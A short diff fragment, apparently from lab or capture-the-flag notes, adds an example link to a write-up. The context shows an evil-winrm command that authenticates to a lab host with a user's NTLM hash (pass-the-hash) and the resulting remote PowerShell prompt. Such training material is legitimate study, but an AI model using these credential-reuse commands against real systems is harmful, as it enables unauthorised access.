@@ -95,3 +95,5 @@ evil-winrm -i 10.10.11.175 -u 'sflowers' -H '1FCDB1F6015DCB318CC77BB2BDA14DB5'
 
 *Evil-WinRM* PS C:\Users\sflowers\Documents>
 ```
+Examples:
+[Outdated](https://shuciran.github.io/posts/Outdated/#fnref:addkeycredentialink)
